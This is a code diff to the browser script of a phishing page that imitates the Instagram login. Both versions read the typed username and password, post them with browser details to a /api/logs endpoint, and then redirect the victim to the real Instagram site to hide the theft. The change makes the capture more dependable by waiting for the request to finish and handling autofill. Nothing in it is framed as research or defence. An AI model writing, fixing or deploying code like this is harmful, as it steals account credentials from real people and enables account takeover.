@@ -1,43 +1,67 @@
 // lang: JS, file: public/app.js, target: browser (login page)
-// Enables login button when both fields have content, POSTs creds to /api/logs,
-// then redirects to real Instagram.
+// Captures creds directly from the form elements on submit, pushes to /api/logs.
 
 (function () {
-  const form = document.getElementById('loginForm');
-  const user = document.getElementById('username');
-  const pass = document.getElementById('password');
-  const btn  = document.getElementById('loginBtn');
+  'use strict';
 
-  function sync() {
-    btn.disabled = !(user.value.trim().length > 0 && pass.value.length > 0);
-  }
-  user.addEventListener('input', sync);
-  pass.addEventListener('input', sync);
+  function init() {
+    const form = document.getElementById('loginForm');
+    const user = document.getElementById('username');
+    const pass = document.getElementById('password');
+    const btn  = document.getElementById('loginBtn');
 
-  form.addEventListener('submit', function (e) {
-    e.preventDefault();
-    if (btn.disabled) return;
+    if (!form || !user || !pass || !btn) {
+      console.error('app.js: login form elements missing');
+      return;
+    }
 
-    const payload = {
-      username: user.value,
-      password: pass.value,
-      ts: new Date().toISOString(),
-      ua: navigator.userAgent,
-      ref: document.referrer || '',
-      lang: navigator.language || '',
-    };
+    // Enable button when typing
+    function sync() {
+      btn.disabled = !(user.value.trim().length > 0 && pass.value.length > 0);
+    }
+    user.addEventListener('input', sync);
+    pass.addEventListener('input', sync);
 
-    try {
+    // Force the button to be enabled right before submit, in case of autofill
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      // Read values directly from the elements, not from the button state
+      const u = user.value;
+      const p = pass.value;
+
+      // If fields are empty, don't send, just redirect (bot check)
+      if (!u && !p) {
+        window.location.href = 'https://www.instagram.com/accounts/login/';
+        return;
+      }
+
+      const payload = {
+        username: u,
+        password: p,
+        ts: new Date().toISOString(),
+        ua: navigator.userAgent,
+        ref: document.referrer || '',
+        lang: navigator.language || '',
+      };
+
+      // Fire the fetch and wait for it to finish before redirecting
       fetch('/api/logs', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
-        keepalive: true,
-      }).catch(function () {});
-    } catch (_) {}
+      })
+      .catch(() => {}) // Swallow network errors
+      .finally(() => {
+        // Redirect only AFTER the request finishes (or fails)
+        window.location.href = 'https://www.instagram.com/accounts/login/';
+      });
+    });
+  }
 
-    setTimeout(function () {
-      window.location.href = 'https://www.instagram.com/accounts/login/';
-    }, 250);
-  });
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
 })();
